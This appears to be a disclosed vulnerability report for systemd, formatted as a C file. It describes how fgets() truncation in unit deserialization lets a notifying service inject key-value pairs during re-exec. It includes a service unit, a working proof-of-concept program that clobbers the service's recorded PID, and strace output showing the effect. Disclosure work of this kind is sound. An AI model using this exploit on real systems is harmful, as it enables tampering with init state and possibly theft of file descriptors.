/*
[I am sending this bug report to Ubuntu, even though it's an upstream
bug, as requested at
https://github.com/systemd/systemd/blob/master/docs/CONTRIBUTING.md#security-vulnerability-reports
.]

When systemd re-executes (e.g. during a package upgrade), state is
serialized into a memfd before the execve(), then reloaded after the
execve(). Serialized data is stored as text, with key-value pairs
separated by newlines. Values are escaped to prevent control character
injection.

Lines associated with a systemd unit are read in unit_deserialize()
using fgets():

                char line[LINE_MAX], *l, *v;
                [...]
                if (!fgets(line, sizeof(line), f)) {
                        if (feof(f))
                                return 0;
                        return -errno;
                }

LINE_MAX is 2048:

/usr/include/bits/posix2_lim.h:#define LINE_MAX         _POSIX2_LINE_MAX
/usr/include/bits/posix2_lim.h:#define _POSIX2_LINE_MAX 2048


When fgets() encounters overlong input, it behaves dangerously. If a
line is more than 2047 characters long, fgets() will return the first
2047 characters and leave the read cursor in the middle of the
overlong line. Then, when fgets() is called the next time, it
continues to read data from offset 2047 in the line as if a new line
started there. Therefore, if an attacker can inject an overlong value
into the serialized state somehow, it is possible to inject extra
key-value pairs into the serialized state.

A service that has `NotifyAccess != none` can send a status message to
systemd that will be stored as a property of the service. When systemd
re-executes, this status message is stored under the key
"status-text".
Status messages that are sent to systemd are received by
manager_dispatch_notify_fd(). This function has a receive buffer of
size NOTIFY_BUFFER_MAX==PIPE_BUF==4096.

Therefore, a service with `NotifyAccess != none` can trigger this bug.


Reproducer:

Create a simple service with NotifyAccess by copying the following
text into /etc/systemd/system/notify_test.service (assuming that your
home directory is /home/user):

=========
[Unit]
Description=jannh test service for systemd notifications

[Service]
Type=simple
NotifyAccess=all
FileDescriptorStoreMax=100
User=user
ExecStart=/home/user/test_service
Restart=always

[Install]
WantedBy=multi-user.target
=========

Create a small binary that sends an overlong status when it starts up:

=========
*/

user@ubuntu-18-04-vm:~$ cat test_service.c
#define _GNU_SOURCE
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <err.h>
#include <signal.h>
#include <stdio.h>

int main(void) {
	int sock = socket(AF_UNIX, SOCK_DGRAM, 0);
	if (sock == -1) err(1, "socket");
	struct sockaddr_un addr = {
		.sun_family = AF_UNIX,
		.sun_path = "/run/systemd/notify"
	};
	if (connect(sock, (struct sockaddr *)&addr, sizeof(addr))) err(1, "connect");

	char message[0x2000] = "STATUS=";
	memset(message+7, 'X', 2048-1-12);
	strcat(message, "main-pid=13371337");
	struct iovec iov = {
		.iov_base = message,
		.iov_len = strlen(message)
	};
	union {
		struct cmsghdr cmsghdr;
		char buf[CMSG_SPACE(sizeof(struct ucred))];
	} control = { .cmsghdr = {
		.cmsg_level = SOL_SOCKET,
		.cmsg_type = SCM_CREDENTIALS,
		.cmsg_len = CMSG_LEN(sizeof(struct ucred))
	}};
	struct ucred *ucred = (void*)(control.buf + CMSG_ALIGN(sizeof(struct cmsghdr)));
	ucred->pid = getpid();
	ucred->uid = getuid();
	ucred->gid = getgid();
	struct msghdr msghdr = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = &control,
		.msg_controllen = sizeof(control)
	};
	if (sendmsg(sock, &msghdr, 0) != strlen(message)) err(1, "sendmsg");

	while (1) pause();
}

/*
user@ubuntu-18-04-vm:~$ gcc -o test_service test_service.c
user@ubuntu-18-04-vm:~$
=========

Install the service, and start it. Then run strace against systemd,
and run:

=========
root@ubuntu-18-04-vm:~# systemctl daemon-reexec
root@ubuntu-18-04-vm:~# systemctl stop notify_test.service
=========

The "stop" command hangs, and you'll see the following in strace:

=========
root@ubuntu-18-04-vm:~# strace -p1 2>&1 | grep 13371337
openat(AT_FDCWD, "/proc/13371337/stat", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
kill(13371337, SIG_0)                   = -1 ESRCH (No such process)
kill(13371337, SIGTERM)                 = -1 ESRCH (No such process)
=========

This demonstrates that systemd's representation of the service's PID
was clobbered by the status message.


This can in theory, depending on how the active services are
configured and some other things, also be used to e.g. steal file
descriptors that other services have stored in systemd (visible in
the serialized representation as "fd-store-fd").

This isn't the only place in systemd that uses fgets(); other uses of
fgets() should probably also be audited and potentially replaced with
a safer function.
*/